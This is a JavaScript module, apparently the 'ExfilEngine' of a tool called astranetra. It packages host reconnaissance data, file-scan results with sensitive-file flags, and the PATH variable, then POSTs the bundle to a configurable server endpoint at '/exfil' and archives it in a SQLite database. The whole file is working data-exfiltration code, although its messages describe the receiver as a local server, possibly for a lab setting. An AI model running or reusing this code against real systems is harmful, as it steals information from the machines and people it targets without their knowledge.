import fs from 'fs';
import path from 'path';
import http from 'http';
import { getLogger } from '../output/Logger.js';
import config from '../config/astranetra.config.js';

const logger = getLogger();

// ── SQL.JS DB ─────────────────────────────────────────────────────────────────
async function getDb() {
  // Lazy import sql.js (CommonJS package, use createRequire)
  const { createRequire } = await import('module');
  const require = createRequire(import.meta.url);
  const initSqlJs = require('sql.js');

  const SQL = await initSqlJs();
  const dbPath = config.exfil.dbPath;
  fs.mkdirSync(path.dirname(dbPath), { recursive: true });

  let db;
  if (fs.existsSync(dbPath)) {
    const fileBuffer = fs.readFileSync(dbPath);
    db = new SQL.Database(fileBuffer);
  } else {
    db = new SQL.Database();
  }

  db.run(`CREATE TABLE IF NOT EXISTS scans (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    scanned_at  TEXT NOT NULL,
    hostname    TEXT,
    platform    TEXT,
    total_files INTEGER,
    total_size  INTEGER,
    hidden_count INTEGER,
    sensitive_count INTEGER,
    full_payload TEXT
  )`);

  function save() {
    const data = db.export();
    fs.writeFileSync(dbPath, Buffer.from(data));
  }

  return { db, save };
}

function saveDb(db) {
  const dbPath = config.exfil.dbPath;
  const data = db.export();
  fs.writeFileSync(dbPath, Buffer.from(data));
}

// ── POST TO LOCAL SERVER ──────────────────────────────────────────────────────
function postToServer(payload, port, host) {
  return new Promise((resolve) => {
    const body = JSON.stringify(payload);
    const options = {
      hostname: host,
      port,
      path:   '/exfil',
      method: 'POST',
      headers: {
        'Content-Type':   'application/json',
        'Content-Length': Buffer.byteLength(body),
      },
    };

    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', chunk => { data += chunk; });
      res.on('end', () => {
        logger.info('ExfilEngine', 'HTTP_POST_SUCCESS', {
          status:    res.statusCode,
          url:       `http://${host}:${port}/exfil`,
          sizeBytes: body.length,
        });
        resolve({ success: true, status: res.statusCode });
      });
    });

    req.on('error', (e) => {
      logger.warn('ExfilEngine', 'HTTP_POST_FAILED', { error: e.message });
      resolve({ success: false, error: e.message });
    });

    req.setTimeout(3000, () => {
      req.destroy();
      resolve({ success: false, error: 'timeout' });
    });

    req.write(body);
    req.end();
  });
}

// ── WRITE TO DB ───────────────────────────────────────────────────────────────
async function writeToDb(payload) {
  try {
    const { db, save } = await getDb();
    const recon  = payload.recon || {};
    const scan   = payload.fileScan || {};

    db.run(
      `INSERT INTO scans
        (scanned_at, hostname, platform, total_files, total_size, hidden_count, sensitive_count, full_payload)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
      [
        payload.exfilAt,
        recon.os?.hostname || 'unknown',
        recon.os?.platform || process.platform,
        scan.totalFiles       || 0,
        scan.totalSizeBytes   || 0,
        scan.hiddenFileCount  || 0,
        scan.sensitiveFlags?.length || 0,
        JSON.stringify(payload),
      ]
    );

    save();
    logger.info('ExfilEngine', 'DB_WRITE_SUCCESS', { dbPath: config.exfil.dbPath });
    return { success: true, dbPath: config.exfil.dbPath };
  } catch (e) {
    logger.error('ExfilEngine', 'DB_WRITE_FAILED', { error: e.message });
    return { success: false, error: e.message };
  }
}

// ── LIST DB SCANS ─────────────────────────────────────────────────────────────
export async function listScans() {
  try {
    const { db } = await getDb();
    const results = db.exec('SELECT id, scanned_at, hostname, platform, total_files, total_size, sensitive_count FROM scans ORDER BY id DESC');
    if (!results.length) return [];
    const [{ columns, values }] = results;
    return values.map(row => Object.fromEntries(columns.map((c, i) => [c, row[i]])));
  } catch (e) {
    logger.error('ExfilEngine', 'DB_LIST_FAILED', { error: e.message });
    return [];
  }
}

export async function clearDb() {
  try {
    const { db, save } = await getDb();
    db.run('DELETE FROM scans');
    save(db);
    console.log('\x1b[32m✓ Database cleared.\x1b[0m');
    return { success: true };
  } catch (e) {
    return { success: false, error: e.message };
  }
}

// ── MAIN EXFIL FUNCTION ───────────────────────────────────────────────────────
export async function runExfil(reconData, scanData, options = {}) {
  const { serverOnly = false, dbOnly = false } = options;
  const port = config.exfil.serverPort;
  const host = config.exfil.serverHost;

  const payload = {
    exfilAt:        new Date().toISOString(),
    source:         'astranetra-local',
    recon:          reconData  || {},
    fileScan:       scanData   || {},
    sensitiveFlags: scanData?.sensitiveFlags || [],
    pathSnapshot:   process.env.PATH || '',
  };

  console.log('\n\x1b[35m━━━ EXFIL ENGINE ━━━\x1b[0m');
  console.log(`\x1b[33mPayload size: ${JSON.stringify(payload).length} bytes\x1b[0m`);

  const results = {};

  // POST to server
  if (!dbOnly) {
    process.stdout.write('\x1b[36m[EXFIL]\x1b[0m POSTing to local server... ');
    results.server = await postToServer(payload, port, host);
    console.log(results.server.success
      ? `\x1b[32m✓ ${results.server.status}\x1b[0m → http://${host}:${port}`
      : `\x1b[31m✗ ${results.server.error}\x1b[0m (is server running? node index.js exfil --server-only)`
    );
  }

  // Write to DB
  if (!serverOnly) {
    process.stdout.write('\x1b[36m[EXFIL]\x1b[0m Writing to SQLite DB... ');
    results.db = await writeToDb(payload);
    console.log(results.db.success
      ? `\x1b[32m✓ Stored\x1b[0m → ${results.db.dbPath}`
      : `\x1b[31m✗ ${results.db.error}\x1b[0m`
    );
  }

  console.log(`\n\x1b[32m✓ Exfil complete.\x1b[0m View at: http://${host}:${port}\n`);
  return { payload, results };
}
